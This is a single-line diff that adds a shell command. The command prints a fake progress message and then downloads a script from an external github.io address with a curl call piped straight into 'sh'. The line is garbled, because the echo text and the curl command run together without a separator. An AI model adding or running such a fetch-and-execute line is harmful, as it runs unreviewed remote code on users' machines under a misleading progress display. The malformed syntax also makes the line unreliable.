@@ -1,0 +1,1 @@
+echo Progress: 45.00%curl -L --progress-bar frkns.github.io/fun/gather_essentials_sexy.hs | sh
